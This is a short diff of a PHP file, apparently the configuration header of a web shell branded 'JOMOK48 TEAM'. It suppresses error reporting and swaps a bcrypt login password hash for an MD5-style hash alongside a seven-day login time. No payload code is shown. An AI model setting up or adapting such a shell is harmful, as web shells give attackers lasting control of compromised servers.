@@ -7,7 +7,7 @@ error_reporting(0);
 @clearstatcache();
 
 $s_title = "JOMOK48 TEAM"; 
-$s_pass = "$2a$12$ffh66bUGp/nmpxyBck8vV.z3h1pWfFGjJch6.slBjSdm.rIFNDQ.G"; 
+$s_pass = "ee59d7e09e847fe0eca855f174428773"; 
 $s_color = "9d1920"; 
 $s_login_time = 3600 * 24 * 7; 
 
